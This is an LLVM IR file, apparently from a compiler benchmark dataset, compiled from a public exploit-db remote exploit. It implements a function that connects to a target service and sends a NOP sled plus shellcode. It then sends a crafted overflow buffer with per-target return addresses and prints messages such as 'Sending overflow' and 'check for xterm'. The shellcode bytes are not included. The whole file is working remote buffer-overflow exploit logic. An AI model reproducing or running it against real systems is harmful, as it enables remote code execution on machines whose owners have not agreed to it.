; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/multiple/remote/extr_828.c_lin.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/multiple/remote/extr_828.c_lin.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_2__ = type { i32, i32, i32 }

@__const.lin.head = private unnamed_addr constant [9 x i8] c"\00M\00\03\00\01\FF\FF\00", align 1
@DATA_LEN = common dso_local global i32 0, align 4
@NOP_LEN = common dso_local global i32 0, align 4
@ARK_PORT = common dso_local global i32 0, align 4
@targets = common dso_local global %struct.TYPE_2__* null, align 8
@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [45 x i8] c"[*] Connected to %s:%d NOP+shellcode socket\0A\00", align 1
@.str.1 = private unnamed_addr constant [40 x i8] c"[*] Connected to %s:%d overflow socket\0A\00", align 1
@NOP = common dso_local global i32 0, align 4
@shellcode = common dso_local global i8* null, align 8
@.str.2 = private unnamed_addr constant [7 x i8] c"%s%s%s\00", align 1
@.str.3 = private unnamed_addr constant [2 x i8] c"K\00", align 1
@.str.4 = private unnamed_addr constant [27 x i8] c"[!] display name too long\0A\00", align 1
@.str.5 = private unnamed_addr constant [28 x i8] c"[*] Sending nops+shellcode\0A\00", align 1
@.str.6 = private unnamed_addr constant [20 x i8] c"[*] Done, sleeping\0A\00", align 1
@HEAD_LEN = common dso_local global i32 0, align 4
@.str.7 = private unnamed_addr constant [22 x i8] c"[*] Sending overflow\0A\00", align 1
@.str.8 = private unnamed_addr constant [27 x i8] c"[*] Done, check for xterm\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @lin(i8* %0, i8* %1, i32 %2) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca [9 x i8], align 1
  %9 = alloca i8*, align 8
  %10 = alloca i64, align 8
  %11 = alloca i64, align 8
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  store i8* %0, i8** %5, align 8
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %21 = bitcast [9 x i8]* %8 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %21, i8* align 1 getelementptr inbounds ([9 x i8], [9 x i8]* @__const.lin.head, i32 0, i32 0), i64 9, i1 false)
  %22 = load i32, i32* @DATA_LEN, align 4
  %23 = zext i32 %22 to i64
  %24 = call i8* @llvm.stacksave()
  store i8* %24, i8** %9, align 8
  %25 = alloca i8, i64 %23, align 16
  store i64 %23, i64* %10, align 8
  %26 = load i32, i32* @NOP_LEN, align 4
  %27 = mul nsw i32 %26, 2
  %28 = zext i32 %27 to i64
  %29 = alloca i8, i64 %28, align 16
  store i64 %28, i64* %11, align 8
  store i32 0, i32* %15, align 4
  %30 = load i32, i32* @ARK_PORT, align 4
  store i32 %30, i32* %16, align 4
  store i32 0, i32* %20, align 4
  store i32 0, i32* %18, align 4
  store i32 0, i32* %17, align 4
  %31 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %32 = load i32, i32* %7, align 4
  %33 = zext i32 %32 to i64
  %34 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %31, i64 %33
  %35 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %34, i32 0, i32 0
  %36 = load i32, i32* %35, align 4
  store i32 %36, i32* %13, align 4
  %37 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %38 = load i32, i32* %7, align 4
  %39 = zext i32 %38 to i64
  %40 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %37, i64 %39
  %41 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %40, i32 0, i32 1
  %42 = load i32, i32* %41, align 4
  store i32 %42, i32* %14, align 4
  %43 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %44 = load i32, i32* %7, align 4
  %45 = zext i32 %44 to i64
  %46 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %43, i64 %45
  %47 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %46, i32 0, i32 2
  %48 = load i32, i32* %47, align 4
  store i32 %48, i32* %15, align 4
  %49 = load i8*, i8** %5, align 8
  %50 = load i32, i32* %16, align 4
  %51 = call i32 @isock(i8* %49, i32 %50)
  store i32 %51, i32* %18, align 4
  %52 = load i32, i32* %18, align 4
  %53 = icmp slt i32 %52, 1
  br i1 %53, label %54, label %56

54:                                               ; preds = %3
  %55 = call i32 @exit(i32 -1) #5
  unreachable

56:                                               ; preds = %3
  %57 = load i32, i32* @stderr, align 4
  %58 = load i8*, i8** %5, align 8
  %59 = load i32, i32* %16, align 4
  %60 = call i32 (i32, i8*, ...) @fprintf(i32 %57, i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str, i64 0, i64 0), i8* %58, i32 %59)
  %61 = load i8*, i8** %5, align 8
  %62 = load i32, i32* %16, align 4
  %63 = call i32 @isock(i8* %61, i32 %62)
  store i32 %63, i32* %17, align 4
  %64 = load i32, i32* %17, align 4
  %65 = icmp slt i32 %64, 1
  br i1 %65, label %66, label %68

66:                                               ; preds = %56
  %67 = call i32 @exit(i32 -1) #5
  unreachable

68:                                               ; preds = %56
  %69 = load i32, i32* @stderr, align 4
  %70 = load i8*, i8** %5, align 8
  %71 = load i32, i32* %16, align 4
  %72 = call i32 (i32, i8*, ...) @fprintf(i32 %69, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.1, i64 0, i64 0), i8* %70, i32 %71)
  %73 = load i32, i32* @NOP, align 4
  %74 = load i32, i32* @DATA_LEN, align 4
  %75 = call i32 @memset(i8* %25, i32 %73, i32 %74)
  %76 = load i32, i32* %15, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds i8, i8* %25, i64 %77
  %79 = getelementptr inbounds i8, i8* %78, i64 -8
  %80 = bitcast i32* %13 to i8*
  %81 = call i32 @memcpy(i8* %79, i8* %80, i32 4)
  %82 = load i32, i32* %15, align 4
  %83 = sext i32 %82 to i64
  %84 = getelementptr inbounds i8, i8* %25, i64 %83
  %85 = getelementptr inbounds i8, i8* %84, i64 -4
  %86 = bitcast i32* %14 to i8*
  %87 = call i32 @memcpy(i8* %85, i8* %86, i32 4)
  %88 = load i32, i32* %15, align 4
  %89 = call i32 @ntohs(i32 %88)
  store i32 %89, i32* %15, align 4
  %90 = getelementptr inbounds [9 x i8], [9 x i8]* %8, i64 0, i64 0
  %91 = getelementptr inbounds i8, i8* %90, i64 6
  %92 = bitcast i32* %15 to i8*
  %93 = call i32 @memcpy(i8* %91, i8* %92, i32 2)
  %94 = load i32, i32* @NOP, align 4
  %95 = load i32, i32* @NOP_LEN, align 4
  %96 = add nsw i32 %95, 1
  %97 = call i32 @memset(i8* %29, i32 %94, i32 %96)
  %98 = load i8*, i8** @shellcode, align 8
  %99 = call i32 @strlen(i8* %98)
  %100 = load i8*, i8** %6, align 8
  %101 = call i32 @strlen(i8* %100)
  %102 = add nsw i32 %99, %101
  %103 = add nsw i32 %102, 2
  %104 = call i64 @malloc(i32 %103)
  %105 = inttoptr i64 %104 to i8*
  store i8* %105, i8** %12, align 8
  %106 = load i8*, i8** %12, align 8
  %107 = load i8*, i8** @shellcode, align 8
  %108 = load i8*, i8** %6, align 8
  %109 = call i32 @sprintf(i8* %106, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.2, i64 0, i64 0), i8* %107, i8* %108, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.3, i64 0, i64 0))
  %110 = load i8*, i8** %12, align 8
  %111 = call i32 @strlen(i8* %110)
  %112 = load i32, i32* @NOP_LEN, align 4
  %113 = add nsw i32 %111, %112
  %114 = load i32, i32* @NOP_LEN, align 4
  %115 = mul nsw i32 %114, 2
  %116 = sub nsw i32 %115, 1
  %117 = icmp sgt i32 %113, %116
  br i1 %117, label %118, label %122

118:                                              ; preds = %68
  %119 = load i32, i32* @stderr, align 4
  %120 = call i32 (i32, i8*, ...) @fprintf(i32 %119, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.4, i64 0, i64 0))
  %121 = call i32 @exit(i32 -1) #5
  unreachable

122:                                              ; preds = %68
  %123 = load i32, i32* @NOP_LEN, align 4
  %124 = sext i32 %123 to i64
  %125 = getelementptr inbounds i8, i8* %29, i64 %124
  %126 = load i8*, i8** %12, align 8
  %127 = load i8*, i8** %12, align 8
  %128 = call i32 @strlen(i8* %127)
  %129 = call i32 @memcpy(i8* %125, i8* %126, i32 %128)
  %130 = load i32, i32* @stderr, align 4
  %131 = call i32 (i32, i8*, ...) @fprintf(i32 %130, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.5, i64 0, i64 0))
  %132 = load i32, i32* %18, align 4
  %133 = load i32, i32* @NOP_LEN, align 4
  %134 = load i8*, i8** %12, align 8
  %135 = call i32 @strlen(i8* %134)
  %136 = add nsw i32 %133, %135
  %137 = add nsw i32 %136, 1
  %138 = call i32 @write(i32 %132, i8* %29, i32 %137)
  %139 = load i32, i32* @stderr, align 4
  %140 = call i32 (i32, i8*, ...) @fprintf(i32 %139, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.6, i64 0, i64 0))
  %141 = call i32 @sleep(i32 1)
  %142 = load i32, i32* %18, align 4
  %143 = call i32 @close(i32 %142)
  %144 = load i32, i32* %17, align 4
  %145 = getelementptr inbounds [9 x i8], [9 x i8]* %8, i64 0, i64 0
  %146 = load i32, i32* @HEAD_LEN, align 4
  %147 = call i32 @write(i32 %144, i8* %145, i32 %146)
  %148 = load i32, i32* %15, align 4
  %149 = call i32 @ntohs(i32 %148)
  store i32 %149, i32* %15, align 4
  %150 = load i32, i32* @stderr, align 4
  %151 = call i32 (i32, i8*, ...) @fprintf(i32 %150, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.7, i64 0, i64 0))
  %152 = load i32, i32* %17, align 4
  %153 = load i32, i32* %15, align 4
  %154 = call i32 @write(i32 %152, i8* %25, i32 %153)
  %155 = load i32, i32* @stderr, align 4
  %156 = call i32 (i32, i8*, ...) @fprintf(i32 %155, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.8, i64 0, i64 0))
  %157 = load i32, i32* %17, align 4
  %158 = call i32 @close(i32 %157)
  %159 = load i8*, i8** %9, align 8
  call void @llvm.stackrestore(i8* %159)
  %160 = load i32, i32* %4, align 4
  ret i32 %160
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #2

declare dso_local i32 @isock(i8*, i32) #3

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #4

declare dso_local i32 @fprintf(i32, i8*, ...) #3

declare dso_local i32 @memset(i8*, i32, i32) #3

declare dso_local i32 @memcpy(i8*, i8*, i32) #3

declare dso_local i32 @ntohs(i32) #3

declare dso_local i64 @malloc(i32) #3

declare dso_local i32 @strlen(i8*) #3

declare dso_local i32 @sprintf(i8*, i8*, i8*, i8*, i8*) #3

declare dso_local i32 @write(i32, i8*, i32) #3

declare dso_local i32 @sleep(i32) #3

declare dso_local i32 @close(i32) #3

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { nounwind }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
